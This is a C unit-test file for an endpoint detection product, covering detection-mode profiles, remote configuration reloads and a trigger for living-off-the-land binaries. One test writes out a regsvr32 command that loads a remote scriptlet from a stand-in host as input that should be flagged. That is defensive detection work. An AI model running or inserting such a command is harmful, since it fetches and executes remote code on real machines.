#include "edr/detection_mode.h"
#include "edr/detection_trigger.h"

#include <stdio.h>
#include <stdbool.h>
#include <string.h>

static int g_failures;

bool edr_resource_preprocess_throttle_active(void) {
  return false;
}

static void expect_true(int cond, const char *msg) {
  if (!cond) {
    fprintf(stderr, "FAIL: %s\n", msg);
    g_failures++;
  }
}

static void base_config(EdrConfig *cfg) {
  memset(cfg, 0, sizeof(*cfg));
  cfg->detection.auto_profile = true;
  cfg->detection.shellcode_mode = 0;
  cfg->detection.webshell_mode = 0;
  cfg->detection.pmfe_mode = 0;
  cfg->attack_surface.enabled = false;
}

static void test_profile_forced_modes(void) {
  EdrConfig cfg;
  base_config(&cfg);
  cfg.detection.shellcode_mode = 1;
  cfg.detection.webshell_mode = 1;
  cfg.detection.pmfe_mode = 2;
  edr_detection_apply_profile(&cfg);
  expect_true(cfg.shellcode_detector.enabled, "shellcode_mode=1 enables shellcode detector");
  expect_true(cfg.webshell_detector.enabled, "webshell_mode=1 enables webshell detector");
  expect_true(cfg.detection.pmfe_mode == 2, "pmfe_mode=2 remains alert-triggered mode");

  cfg.detection.shellcode_mode = 0;
  cfg.detection.webshell_mode = 0;
  cfg.detection.pmfe_mode = 0;
  edr_detection_apply_profile(&cfg);
  expect_true(!cfg.shellcode_detector.enabled, "shellcode_mode=0 disables shellcode detector");
  expect_true(!cfg.webshell_detector.enabled, "webshell_mode=0 disables webshell detector");
  expect_true(cfg.detection.pmfe_mode == 0, "pmfe_mode=0 disables PMFE policy triggers");
}

static void test_remote_modes_copy_and_apply(void) {
  EdrConfig current;
  EdrConfig remote;
  base_config(&current);
  base_config(&remote);
  remote.detection.auto_profile = false;
  remote.detection.shellcode_mode = 1;
  remote.detection.webshell_mode = 1;
  remote.detection.pmfe_mode = 2;
  expect_true(edr_detection_apply_remote_modes(&current, &remote) == 1,
              "remote detection change should request sensor hot reload");
  expect_true(current.shellcode_detector.enabled, "remote shellcode mode should be effective");
  expect_true(current.webshell_detector.enabled, "remote webshell mode should be effective");
  expect_true(current.detection.pmfe_mode == 2, "remote PMFE trigger mode should be effective");
  expect_true(edr_detection_apply_remote_modes(&current, &remote) == 0,
              "replaying identical detection modes should be idempotent");
}

static void test_trigger_regsvr32_remote_sct(void) {
  EdrConfig cfg;
  EdrEventSlot slot;
  EdrBehaviorRecord br;
  EdrDetectionDecision dec;

  base_config(&cfg);
  cfg.detection.pmfe_mode = 2;
  memset(&slot, 0, sizeof(slot));
  memset(&br, 0, sizeof(br));
  slot.type = EDR_EVENT_PROCESS_CREATE;
  slot.priority = 0;
  br.type = EDR_EVENT_PROCESS_CREATE;
  br.pid = 4321;
  snprintf(br.process_name, sizeof(br.process_name), "%s", "regsvr32.exe");
  snprintf(br.cmdline, sizeof(br.cmdline), "%s",
           "regsvr32.exe /s /n /u /i:https://example.test/a.sct scrobj.dll");

  expect_true(edr_detection_trigger_evaluate(&cfg, &slot, &br, &dec),
              "regsvr32 remote SCT should produce a detection decision");
  expect_true(dec.recommend_pmfe, "regsvr32 remote SCT should recommend PMFE");
  expect_true(dec.pmfe_pid == 4321, "PMFE target should be the regsvr32 PID");
  expect_true(strcmp(dec.pmfe_reason, "lolbin_remote_payload") == 0,
              "PMFE reason should identify LOLBin remote payload");
  expect_true(!dec.recommend_minidump, "P0 trigger must not auto-recommend minidump");
}

static void test_trigger_ordinary_file_event_skips_pmfe(void) {
  EdrConfig cfg;
  EdrEventSlot slot;
  EdrBehaviorRecord br;
  EdrDetectionDecision dec;

  base_config(&cfg);
  cfg.detection.pmfe_mode = 2;
  memset(&slot, 0, sizeof(slot));
  memset(&br, 0, sizeof(br));
  slot.type = EDR_EVENT_FILE_CREATE;
  slot.priority = 1;
  br.type = EDR_EVENT_FILE_CREATE;
  br.pid = 2000;
  snprintf(br.process_name, sizeof(br.process_name), "%s", "notepad.exe");
  snprintf(br.file_path, sizeof(br.file_path), "%s", "C:\\Temp\\sample.txt");

  expect_true(!edr_detection_trigger_evaluate(&cfg, &slot, &br, &dec),
              "ordinary file event should not trigger PMFE");
  expect_true(!dec.recommend_pmfe, "ordinary file event should not recommend PMFE");
}

static void test_trigger_requires_exact_process_basename(void) {
  EdrConfig cfg;
  EdrEventSlot slot;
  EdrBehaviorRecord br;
  EdrDetectionDecision dec;

  base_config(&cfg);
  cfg.detection.pmfe_mode = 2;
  memset(&slot, 0, sizeof(slot));
  memset(&br, 0, sizeof(br));
  slot.type = EDR_EVENT_PROCESS_CREATE;
  slot.priority = 0;
  br.type = EDR_EVENT_PROCESS_CREATE;
  br.pid = 5333;
  snprintf(br.process_name, sizeof(br.process_name), "%s", "myregsvr32.exe");
  snprintf(br.cmdline, sizeof(br.cmdline), "%s", "myregsvr32.exe https://example.test/a.sct scrobj.dll");

  expect_true(!edr_detection_trigger_evaluate(&cfg, &slot, &br, &dec),
              "lookalike process names must not match LOLBin triggers");
  expect_true(!dec.recommend_pmfe, "lookalike process name should not recommend PMFE");
}

int main(void) {
  test_profile_forced_modes();
  test_remote_modes_copy_and_apply();
  test_trigger_regsvr32_remote_sct();
  test_trigger_ordinary_file_event_skips_pmfe();
  test_trigger_requires_exact_process_basename();
  return g_failures == 0 ? 0 : 1;
}
